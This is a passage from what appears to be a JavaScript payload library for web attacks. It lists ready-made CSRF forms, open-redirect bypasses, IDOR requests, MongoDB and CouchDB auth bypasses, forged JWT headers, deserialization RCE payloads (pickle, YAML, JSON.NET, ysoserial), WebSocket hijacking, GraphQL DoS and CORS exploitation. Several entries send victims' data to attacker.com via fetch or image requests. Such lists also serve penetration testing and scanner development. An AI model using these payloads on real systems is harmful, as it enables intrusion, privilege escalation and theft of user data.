    risk: "high"
  },
  {
    cat: "CSRF",
    name: "Iframe hidden CSRF",
    payload: "<iframe style=\"display:none\" name=\"csrf-frame\"></iframe><form target=\"csrf-frame\" action=\"https://target.com/delete\" method=\"POST\"><input type=\"hidden\" name=\"id\" value=\"1\"/></form><script>document.forms[0].submit()</script>",
    desc: "CSRF submitted to hidden iframe to avoid navigation",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "CSRF token fixation",
    payload: "<html><body><form action=\"https://target.com/action\" method=\"POST\"><input type=\"hidden\" name=\"csrf_token\" value=\"attacker_known_token\"/><input type=\"hidden\" name=\"action\" value=\"delete\"/></form><script>document.forms[0].submit()</script></body></html>",
    desc: "CSRF with pre-set token when tokens are not user-bound",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "Drag-and-drop CSRF",
    payload: "<div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/html','<form action=https://target.com/api method=POST><input name=cmd value=delete></form>')\">Drag me</div>",
    desc: "CSRF via drag-and-drop interaction",
    risk: "medium"
  },
  {
    cat: "CSRF",
    name: "WebSocket CSRF",
    payload: "<script>var ws=new WebSocket('wss://target.com/ws');ws.onopen=function(){ws.send(JSON.stringify({action:'delete',id:1}));};</script>",
    desc: "CSRF over WebSocket connection (no CORS restrictions)",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "CSRF with method override",
    payload: "<form action=\"https://target.com/api/admin\" method=\"POST\"><input type=\"hidden\" name=\"_method\" value=\"PUT\"/><input type=\"hidden\" name=\"role\" value=\"admin\"/></form><script>document.forms[0].submit()</script>",
    desc: "CSRF using HTTP method override parameter",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "Login CSRF",
    payload: "<form action=\"https://target.com/login\" method=\"POST\"><input name=\"username\" value=\"attacker\"/><input name=\"password\" value=\"pass123\"/></form><script>document.forms[0].submit()</script>",
    desc: "Login CSRF to force victim into attacker-controlled session",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "CSRF via Flash (legacy)",
    payload: "<embed src=\"https://attacker.com/csrf.swf\" type=\"application/x-shockwave-flash\">",
    desc: "Legacy CSRF via Flash cross-domain request (historical)",
    risk: "medium"
  },
  {
    cat: "CSRF",
    name: "CSRF via clickjacking",
    payload: "<iframe src=\"https://target.com/settings\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%\"></iframe><button style=\"position:relative;z-index:-1\">Click me</button>",
    desc: "Combine clickjacking with CSRF for UI redress attack",
    risk: "high"
  },
  {
    cat: "CSRF",
    name: "SameSite=None exploit",
    payload: "<script>fetch('https://target.com/api/action',{method:'POST',credentials:'include',body:'delete=1'});</script>",
    desc: "CSRF against endpoints with SameSite=None cookies",
    risk: "high"
  },

  // ==========================================================================
  // OPEN REDIRECT (17 payloads)
  // ==========================================================================

  {
    cat: "OpenRedirect",
    name: "Basic redirect (url param)",
    payload: "https://target.com/redirect?url=https://evil.com",
    desc: "Open redirect via url parameter",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Basic redirect (next param)",
    payload: "https://target.com/login?next=https://evil.com",
    desc: "Open redirect via next/return parameter after login",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Protocol-relative redirect",
    payload: "//evil.com",
    desc: "Protocol-relative URL redirect bypass",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Backslash bypass",
    payload: "https://evil.com\\@target.com",
    desc: "Backslash URL parsing confusion for redirect bypass",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "At-sign bypass",
    payload: "https://target.com@evil.com",
    desc: "URL userinfo section to redirect to evil.com",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Double URL encoding",
    payload: "https://target.com/redirect?url=https%253A%252F%252Fevil.com",
    desc: "Double-encoded URL to bypass redirect validation",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Null byte bypass",
    payload: "https://target.com%00.evil.com",
    desc: "Null byte to truncate hostname validation",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Tab/newline bypass",
    payload: "https://target.com/redirect?url=http:%0a%0devil.com",
    desc: "Newline injection in URL to bypass validation",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "JavaScript redirect",
    payload: "javascript:window.location='https://evil.com'",
    desc: "JavaScript URI scheme redirect",
    risk: "high"
  },
  {
    cat: "OpenRedirect",
    name: "Data URI redirect",
    payload: "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=",
    desc: "Data URI with embedded redirect script",
    risk: "high"
  },
  {
    cat: "OpenRedirect",
    name: "Subdomain bypass",
    payload: "https://evil.com.target.com",
    desc: "Subdomain confusion redirect bypass",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Path-based redirect",
    payload: "https://target.com/redirect/https://evil.com",
    desc: "Open redirect via path segment",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Fragment redirect",
    payload: "https://target.com/redirect?url=#https://evil.com",
    desc: "Fragment-based redirect bypass attempt",
    risk: "low"
  },
  {
    cat: "OpenRedirect",
    name: "Unicode normalization",
    payload: "https://target.com/redirect?url=https://evil\u3002com",
    desc: "Unicode dot character bypass (fullwidth period)",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "URL with whitespace",
    payload: "https://target.com/redirect?url= https://evil.com",
    desc: "Leading whitespace to bypass URL validation regex",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Meta refresh redirect",
    payload: "https://target.com/redirect?url=data:text/html,<meta http-equiv='refresh' content='0;url=https://evil.com'>",
    desc: "Meta refresh redirect via data URI",
    risk: "high"
  },
  {
    cat: "OpenRedirect",
    name: "CRLF redirect",
    payload: "https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com",
    desc: "CRLF injection to force redirect via Location header",
    risk: "high"
  },

  // ==========================================================================
  // IDOR - Insecure Direct Object Reference (16 payloads)
  // ==========================================================================

  {
    cat: "IDOR",
    name: "Sequential user ID",
    payload: "GET /api/users/1 -> /api/users/2",
    desc: "Iterate user IDs to access other users' data",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "UUID prediction",
    payload: "GET /api/documents/{uuid} (enumerate UUIDs from leaked sources)",
    desc: "Access documents by guessing/enumerating UUIDs",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "Parameter tampering (userId)",
    payload: "POST /api/profile {\"userId\": 2, \"name\": \"hacked\"}",
    desc: "Modify another user's profile by changing userId in request",
    risk: "critical"
  },
  {
    cat: "IDOR",
    name: "File download by ID",
    payload: "GET /api/files/download?id=OTHER_USER_FILE_ID",
    desc: "Download other users' files by changing file ID",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "Order ID enumeration",
    payload: "GET /api/orders/1001 -> /api/orders/1002",
    desc: "Access other users' order details via sequential IDs",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "Invoice ID access",
    payload: "GET /api/invoices/INV-001 -> /api/invoices/INV-002",
    desc: "Access other users' invoices via predictable IDs",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "Delete other user's resource",
    payload: "DELETE /api/posts/OTHER_USER_POST_ID",
    desc: "Delete another user's post by referencing their post ID",
    risk: "critical"
  },
  {
    cat: "IDOR",
    name: "Role escalation via body",
    payload: "PUT /api/users/self {\"role\": \"admin\"}",
    desc: "Privilege escalation by modifying role in request body",
    risk: "critical"
  },
  {
    cat: "IDOR",
    name: "Hidden param pollution",
    payload: "POST /api/update {\"id\": 1, \"email\": \"new@email.com\", \"isAdmin\": true}",
    desc: "Add hidden isAdmin parameter to escalate privileges",
    risk: "critical"
  },
  {
    cat: "IDOR",
    name: "Path traversal in API",
    payload: "GET /api/users/1/../2/profile",
    desc: "Path traversal in REST API to access other user profiles",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "Bulk data access",
    payload: "GET /api/users?limit=10000&offset=0",
    desc: "Mass data extraction by requesting large limit",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "GraphQL IDOR",
    payload: "query { user(id: 2) { email password } }",
    desc: "GraphQL query for another user's sensitive fields",
    risk: "critical"
  },
  {
    cat: "IDOR",
    name: "Referer-based IDOR",
    payload: "GET /api/data (Referer: /admin/dashboard)",
    desc: "Bypass access control that only checks Referer header",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "Cookie-based IDOR",
    payload: "Cookie: user_id=2 (changed from user_id=1)",
    desc: "IDOR by modifying user identifier in cookie",
    risk: "critical"
  },
  {
    cat: "IDOR",
    name: "JWT claim manipulation",
    payload: "Decode JWT, change sub claim to another user's ID, re-encode",
    desc: "IDOR by modifying JWT subject claim (if signature not verified)",
    risk: "critical"
  },
  {
    cat: "IDOR",
    name: "Webhook URL IDOR",
    payload: "GET /api/webhooks/OTHER_ORG_WEBHOOK_ID",
    desc: "Access or modify another organization's webhook configuration",
    risk: "high"
  },

  // ==========================================================================
  // NoSQL INJECTION (18 payloads)
  // ==========================================================================

  // --- MongoDB ---
  {
    cat: "NoSQLi",
    name: "MongoDB auth bypass (ne)",
    payload: "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
    desc: "MongoDB auth bypass using $ne (not equal) operator",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB auth bypass (gt)",
    payload: "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
    desc: "MongoDB auth bypass using $gt (greater than) operator",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB auth bypass (regex)",
    payload: "{\"username\":\"admin\",\"password\":{\"$regex\":\".*\"}}",
    desc: "MongoDB auth bypass using $regex to match any password",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB enum (regex prefix)",
    payload: "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}",
    desc: "Character-by-character password extraction via regex",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB wildcard user",
    payload: "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$ne\":\"\"}}",
    desc: "Match any user with any non-empty password",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB $where injection",
    payload: "{\"$where\":\"this.username=='admin' && this.password.match(/.*/)\"}",
    desc: "Server-side JavaScript injection via $where operator",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB $where sleep",
    payload: "{\"$where\":\"sleep(5000)\"}",
    desc: "Time-based blind NoSQL injection via $where sleep",
    risk: "high"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB $or bypass",
    payload: "{\"$or\":[{\"username\":\"admin\"},{\"username\":\"administrator\"}],\"password\":{\"$ne\":\"\"}}",
    desc: "MongoDB $or to try multiple usernames",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB $in operator",
    payload: "{\"username\":{\"$in\":[\"admin\",\"root\",\"superadmin\"]},\"password\":{\"$ne\":\"\"}}",
    desc: "Test multiple usernames with $in operator",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB URL param injection",
    payload: "username=admin&password[$ne]=",
    desc: "NoSQL injection via URL query parameters (Express.js)",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB data exfil ($regex)",
    payload: "{\"password\":{\"$regex\":\"^p@ss\"}}",
    desc: "Data exfiltration using $regex character brute-force",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB $exists enum",
    payload: "{\"secretField\":{\"$exists\":true}}",
    desc: "Check if a hidden/undocumented field exists",
    risk: "high"
  },
  {
    cat: "NoSQLi",
    name: "MongoDB $type check",
    payload: "{\"password\":{\"$type\":2}}",
    desc: "Filter by BSON type to identify field data types",
    risk: "medium"
  },

  // --- CouchDB ---
  {
    cat: "NoSQLi",
    name: "CouchDB all docs",
    payload: "GET /database/_all_docs?include_docs=true",
    desc: "CouchDB dump all documents in database",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "CouchDB Mango injection",
    payload: "{\"selector\":{\"password\":{\"$gt\":null}},\"fields\":[\"username\",\"password\"]}",
    desc: "CouchDB Mango query to extract credentials",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "CouchDB admin creation",
    payload: "PUT /_users/org.couchdb.user:attacker {\"name\":\"attacker\",\"password\":\"pass\",\"roles\":[\"_admin\"],\"type\":\"user\"}",
    desc: "Create admin user in unsecured CouchDB",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "CouchDB config read",
    payload: "GET /_config/",
    desc: "Read CouchDB configuration (may expose credentials)",
    risk: "critical"
  },
  {
    cat: "NoSQLi",
    name: "CouchDB view injection",
    payload: "GET /database/_design/docs/_view/all",
    desc: "Access CouchDB design document views for data extraction",
    risk: "high"
  },

  // ==========================================================================
  // JWT ATTACKS (18 payloads)
  // ==========================================================================

  // --- None Algorithm ---
  {
    cat: "JWT",
    name: "None algorithm (lowercase)",
    payload: "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"admin\",\"iat\":1700000000}.",
    desc: "JWT with alg:none to bypass signature verification",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "None algorithm (mixed case)",
    payload: "{\"alg\":\"NoNe\",\"typ\":\"JWT\"}.{\"sub\":\"admin\"}.",
    desc: "JWT alg:NoNe mixed case bypass for case-sensitive checks",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "None algorithm (None)",
    payload: "{\"alg\":\"None\",\"typ\":\"JWT\"}.{\"sub\":\"admin\",\"role\":\"admin\"}.",
    desc: "JWT alg:None capitalized variant",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "None algorithm (NONE)",
    payload: "{\"alg\":\"NONE\",\"typ\":\"JWT\"}.{\"sub\":\"admin\"}.",
    desc: "JWT alg:NONE uppercase variant",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "None algorithm (nOnE)",
    payload: "{\"alg\":\"nOnE\",\"typ\":\"JWT\"}.{\"sub\":\"admin\"}.",
    desc: "JWT alg:nOnE alternating case variant",
    risk: "critical"
  },

  // --- Weak Secret ---
  {
    cat: "JWT",
    name: "Weak secret (empty)",
    payload: "Sign with key: '' (empty string)",
    desc: "JWT signed with empty string secret",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "Weak secret (secret)",
    payload: "Sign with key: 'secret'",
    desc: "JWT brute-force using common weak secret",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "Weak secret (password)",
    payload: "Sign with key: 'password'",
    desc: "JWT signed with 'password' as HMAC secret",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "Weak secret (jwt_secret)",
    payload: "Sign with key: 'jwt_secret'",
    desc: "JWT signed with common default secret key name",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "Algorithm confusion (RS256->HS256)",
    payload: "Change alg from RS256 to HS256, sign with public key as HMAC secret",
    desc: "Algorithm confusion: use known RSA public key as HMAC symmetric key",
    risk: "critical"
  },

  // --- KID Injection ---
  {
    cat: "JWT",
    name: "KID path traversal",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../dev/null\"}",
    desc: "KID path traversal to use empty file (sign with empty string)",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "KID SQLi",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key' UNION SELECT 'secret'--\"}",
    desc: "SQL injection in KID parameter to control signing key",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "KID command injection",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key|/usr/bin/id\"}",
    desc: "Command injection via KID parameter",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "KID SSRF",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"http://attacker.com/key\"}",
    desc: "SSRF via KID to fetch signing key from attacker server",
    risk: "critical"
  },

  // --- Other JWT Attacks ---
  {
    cat: "JWT",
    name: "JWK header injection",
    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"...\",\"e\":\"AQAB\"}}",
    desc: "Embed attacker RSA public key in JWK header, sign with matching private key",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "JKU header injection",
    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://attacker.com/.well-known/jwks.json\"}",
    desc: "Point JKU to attacker-controlled JWKS endpoint",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "X5U header injection",
    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"x5u\":\"https://attacker.com/cert.pem\"}",
    desc: "Point x5u to attacker-controlled certificate",
    risk: "critical"
  },
  {
    cat: "JWT",
    name: "Claim manipulation (exp)",
    payload: "{\"sub\":\"user\",\"role\":\"admin\",\"exp\":9999999999}",
    desc: "Modify claims: escalate role and set far-future expiration",
    risk: "critical"
  },

  // ==========================================================================
  // DESERIALIZATION (20 payloads)
  // ==========================================================================

  // --- Java ---
  {
    cat: "Deser",
    name: "Java (Commons Collections 1)",
    payload: "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVz... (ysoserial CommonsCollections1)",
    desc: "Java deserialization RCE via Apache Commons Collections gadget chain",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "Java (Commons Collections 5)",
    payload: "ysoserial CommonsCollections5 'id'",
    desc: "Java deser RCE using CommonsCollections5 gadget (bypass readObject checks)",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "Java (Commons Beanutils)",
    payload: "ysoserial CommonsBeanutils1 'id'",
    desc: "Java deser RCE via Commons Beanutils PropertyUtils gadget",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "Java (Spring1)",
    payload: "ysoserial Spring1 'id'",
    desc: "Java deser RCE via Spring Framework gadget chain",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "Java (URLDNS detection)",
    payload: "ysoserial URLDNS 'http://ATTACKER.burpcollaborator.net'",
    desc: "Java deser detection via DNS callback (no RCE, just detection)",
    risk: "high"
  },
  {
    cat: "Deser",
    name: "Java (JRMPClient)",
    payload: "ysoserial JRMPClient 'ATTACKER_IP:1099'",
    desc: "Java deser to connect back via JRMP for second-stage payload",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "Java (magic bytes check)",
    payload: "Check for 0xACED0005 (Java serialized object magic bytes)",
    desc: "Detect Java serialized objects by magic byte signature",
    risk: "medium"
  },

  // --- PHP ---
  {
    cat: "Deser",
    name: "PHP object injection (basic)",
    payload: "O:8:\"stdClass\":1:{s:4:\"test\";s:2:\"ok\";}",
    desc: "Basic PHP serialized object injection",
    risk: "high"
  },
  {
    cat: "Deser",
    name: "PHP RCE via __destruct",
    payload: "O:14:\"VulnerableClass\":1:{s:3:\"cmd\";s:2:\"id\";}",
    desc: "PHP deser RCE via __destruct or __wakeup magic method",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "PHP POP chain",
    payload: "O:7:\"GadgetA\":1:{s:4:\"next\";O:7:\"GadgetB\":1:{s:3:\"cmd\";s:2:\"id\";}}",
    desc: "PHP POP (Property-Oriented Programming) chain for RCE",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "PHP phar deserialization",
    payload: "phar://uploads/evil.phar (trigger via file operation on phar:// stream)",
    desc: "PHP phar deser triggered by file operations (file_exists, fopen, etc.)",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "PHP type juggling",
    payload: "O:4:\"User\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";b:1;}",
    desc: "PHP deser with boolean true for password (loose comparison bypass)",
    risk: "critical"
  },

  // --- Python ---
  {
    cat: "Deser",
    name: "Python pickle RCE",
    payload: "import pickle,os;pickle.loads(b\"cos\\nsystem\\n(S'id'\\ntR.\")",
    desc: "Python pickle deserialization RCE via os.system",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "Python pickle (base64)",
    payload: "gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
    desc: "Base64-encoded Python pickle payload for RCE",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "Python YAML unsafe_load",
    payload: "!!python/object/apply:os.system ['id']",
    desc: "Python YAML deserialization RCE via unsafe_load",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: "Python YAML subprocess",
    payload: "!!python/object/apply:subprocess.check_output [['id']]",
    desc: "Python YAML deser RCE via subprocess.check_output",
    risk: "critical"
  },

  // --- .NET ---
  {
    cat: "Deser",
    name: ".NET BinaryFormatter",
    payload: "ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -c 'whoami'",
    desc: ".NET BinaryFormatter deserialization RCE",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: ".NET ObjectStateFormatter",
    payload: "ysoserial.net -f ObjectStateFormatter -g TextFormattingRunProperties -c 'whoami'",
    desc: ".NET ViewState deserialization RCE (when MAC disabled)",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: ".NET JSON.NET ($type)",
    payload: "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\",\"StartInfo\":{\"$type\":\"System.Diagnostics.ProcessStartInfo, System\",\"FileName\":\"cmd\",\"Arguments\":\"/c whoami\"}}}",
    desc: ".NET JSON.NET TypeNameHandling.All RCE via ObjectDataProvider",
    risk: "critical"
  },
  {
    cat: "Deser",
    name: ".NET DataContractSerializer",
    payload: "ysoserial.net -f DataContractSerializer -g TextFormattingRunProperties -c 'whoami'",
    desc: ".NET DataContractSerializer deserialization RCE",
    risk: "critical"
  },

  // ==========================================================================
  // WEBSOCKET ATTACKS (12 payloads)
  // ==========================================================================

  {
    cat: "WebSocket",
    name: "Cross-site WebSocket hijack",
    payload: "var ws = new WebSocket('wss://target.com/ws'); ws.onopen = function() { ws.send('{\"action\":\"getProfile\"}'); }; ws.onmessage = function(e) { fetch('https://attacker.com/steal?d='+btoa(e.data)); };",
    desc: "Cross-site WebSocket hijacking to steal data (no Origin check)",
    risk: "critical"
  },
  {
    cat: "WebSocket",
    name: "WS message injection (XSS)",
    payload: "{\"message\":\"<img src=x onerror=alert(document.cookie)>\"}",
    desc: "XSS via WebSocket message reflected in DOM",
    risk: "high"
  },
  {
    cat: "WebSocket",
    name: "WS message injection (SQLi)",
    payload: "{\"query\":\"' OR 1=1--\"}",
    desc: "SQL injection via WebSocket message parameter",
    risk: "critical"
  },
  {
    cat: "WebSocket",
    name: "WS auth bypass",
    payload: "Connect without token, send: {\"action\":\"admin_panel\"}",
    desc: "Test if WebSocket endpoint enforces authentication",
    risk: "high"
  },
  {
    cat: "WebSocket",
    name: "WS race condition",
    payload: "Send rapid concurrent messages: {\"action\":\"transfer\",\"amount\":100} x 10",
    desc: "Race condition via rapid WebSocket messages (double-spend)",
    risk: "critical"
  },
  {
    cat: "WebSocket",
    name: "WS DoS (large payload)",
    payload: "ws.send('A'.repeat(10000000))",
    desc: "WebSocket denial of service via oversized message",
    risk: "high"
  },
  {
    cat: "WebSocket",
    name: "WS upgrade hijack",
    payload: "GET / HTTP/1.1\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\nSec-WebSocket-Version: 13\\r\\nOrigin: https://evil.com",
    desc: "WebSocket upgrade request from unauthorized Origin",
    risk: "high"
  },
  {
    cat: "WebSocket",
    name: "WS IDOR",
    payload: "{\"action\":\"getMessages\",\"channelId\":\"OTHER_CHANNEL_ID\"}",
    desc: "IDOR via WebSocket to access other users' channels",
    risk: "high"
  },
  {
    cat: "WebSocket",
    name: "WS command injection",
    payload: "{\"action\":\"ping\",\"host\":\"127.0.0.1; id\"}",
    desc: "OS command injection via WebSocket message handler",
    risk: "critical"
  },
  {
    cat: "WebSocket",
    name: "WS smuggling (HTTP/WS)",
    payload: "Craft HTTP request interpreted as WebSocket upgrade by proxy but not origin",
    desc: "HTTP request smuggling via WebSocket upgrade confusion",
    risk: "high"
  },
  {
    cat: "WebSocket",
    name: "WS message tampering",
    payload: "Intercept and modify: {\"action\":\"setRole\",\"role\":\"admin\"}",
    desc: "Privilege escalation by tampering with WebSocket messages",
    risk: "critical"
  },
  {
    cat: "WebSocket",
    name: "WS reconnect token theft",
    payload: "ws.onclose = function() { steal(reconnectToken); };",
    desc: "Steal reconnection tokens when WebSocket connection drops",
    risk: "high"
  },

  // ==========================================================================
  // GRAPHQL ATTACKS (14 payloads)
  // ==========================================================================

  {
    cat: "GraphQL",
    name: "Introspection query",
    payload: "{__schema{types{name,fields{name,type{name}}}}}",
    desc: "Full GraphQL schema introspection to enumerate all types and fields",
    risk: "medium"
  },
  { cat: "GraphQL", name: "Introspection (full)", payload: "{\"query\":\"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name kind description fields(includeDeprecated:true){name description args{name description type{name kind ofType{name kind}}}type{name kind ofType{name kind}}}inputFields{name description type{name kind ofType{name kind}}}interfaces{name kind ofType{name kind}}enumValues(includeDeprecated:true){name description}possibleTypes{name kind ofType{name kind}}}}}\"}",  desc: "Complete introspection query for full schema dump", risk: "medium" },
  {
    cat: "GraphQL",
    name: "Field suggestion probe",
    payload: "{user{passwor}}",
    desc: "Trigger field suggestion errors to discover valid field names",
    risk: "low"
  },
  {
    cat: "GraphQL",
    name: "Batch query attack",
    payload: "[{\"query\":\"{user(id:1){email}}\"},{\"query\":\"{user(id:2){email}}\"},{\"query\":\"{user(id:3){email}}\"}]",
    desc: "Batch multiple queries to enumerate users in a single request",
    risk: "high"
  },
  {
    cat: "GraphQL",
    name: "Alias-based enumeration",
    payload: "{u1:user(id:1){email} u2:user(id:2){email} u3:user(id:3){email}}",
    desc: "Use aliases to query multiple records in one request",
    risk: "high"
  },
  { cat: "GraphQL", name: "Nested query DoS", payload: "{user{friends{friends{friends{friends{friends{friends{name}}}}}}}}",  desc: "Deeply nested query for denial of service (query depth attack)", risk: "high" },
  {
    cat: "GraphQL",
    name: "Directive overloading DoS",
    payload: "query { user @aa @bb @cc @dd @ee @ff @gg @hh @ii @jj { name } }",
    desc: "Directive overloading to cause resource exhaustion",
    risk: "medium"
  },
  {
    cat: "GraphQL",
    name: "SQLi via argument",
    payload: "{user(name:\"' OR 1=1--\"){id email}}",
    desc: "SQL injection through GraphQL query argument",
    risk: "critical"
  },
  {
    cat: "GraphQL",
    name: "Auth bypass (mutation)",
    payload: "mutation{updateUser(id:1,role:\"admin\"){id role}}",
    desc: "Privilege escalation via GraphQL mutation without auth check",
    risk: "critical"
  },
  {
    cat: "GraphQL",
    name: "Subscription abuse",
    payload: "subscription{onUserCreated{id email password}}",
    desc: "Subscribe to events that leak sensitive data",
    risk: "high"
  },
  {
    cat: "GraphQL",
    name: "File upload mutation",
    payload: "mutation{uploadFile(file:\"malicious.php\")}",
    desc: "Test file upload mutation for unrestricted file types",
    risk: "high"
  },
  {
    cat: "GraphQL",
    name: "CSRF via GET",
    payload: "GET /graphql?query=mutation{deleteUser(id:1)}",
    desc: "GraphQL mutation via GET request for CSRF exploitation",
    risk: "high"
  },
  {
    cat: "GraphQL",
    name: "Debug mode detection",
    payload: "{__typename} (check for stack traces and verbose errors)",
    desc: "Detect debug/development mode via error verbosity",
    risk: "low"
  },
  {
    cat: "GraphQL",
    name: "Circular fragment DoS",
    payload: "fragment A on User { friends { ...B } } fragment B on User { friends { ...A } } { user { ...A } }",
    desc: "Circular fragment reference for DoS (if no depth limit)",
    risk: "high"
  },

  // ==========================================================================
  // CORS MISCONFIGURATION (12 payloads)
  // ==========================================================================

  {
    cat: "CORS",
    name: "Reflected Origin",
    payload: "Origin: https://evil.com (check if reflected in Access-Control-Allow-Origin)",
    desc: "Test if server reflects arbitrary Origin in ACAO header",
    risk: "high"
  },
  {
    cat: "CORS",
    name: "Null Origin",
    payload: "Origin: null",
    desc: "Test if null origin is allowed (sandboxed iframe, data URI)",
    risk: "high"
  },
  {
    cat: "CORS",
    name: "Subdomain wildcard",
    payload: "Origin: https://evil.target.com",
    desc: "Test if any subdomain is accepted in CORS policy",
    risk: "high"
  },
  {
    cat: "CORS",
    name: "Prefix match bypass",
    payload: "Origin: https://target.com.evil.com",
    desc: "Test for prefix-match CORS validation bypass",
    risk: "high"
  },
  {
    cat: "CORS",
    name: "Suffix match bypass",
    payload: "Origin: https://eviltarget.com",
    desc: "Test for suffix-match CORS validation bypass",
    risk: "high"
  },
  {
    cat: "CORS",
    name: "Special chars bypass",
    payload: "Origin: https://target.com%60.evil.com",
    desc: "Test URL parsing differences with special characters",
    risk: "high"
  },
  {
    cat: "CORS",
    name: "Credentials with wildcard",
    payload: "Check: Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true",
    desc: "Detect misconfigured wildcard with credentials (should be invalid)",
    risk: "critical"
  },
  {
    cat: "CORS",
    name: "CORS data theft (fetch)",
    payload: "fetch('https://target.com/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?d='+JSON.stringify(d)))",
    desc: "Exploit CORS to steal authenticated user data",
    risk: "critical"
  },
  {
    cat: "CORS",
    name: "CORS data theft (XHR)",
    payload: "var x=new XMLHttpRequest();x.open('GET','https://target.com/api/sensitive');x.withCredentials=true;x.onload=function(){new Image().src='https://attacker.com/?d='+btoa(this.responseText)};x.send();",
    desc: "CORS exploitation via XHR to exfiltrate sensitive data",
    risk: "critical"
  },
  {
    cat: "CORS",
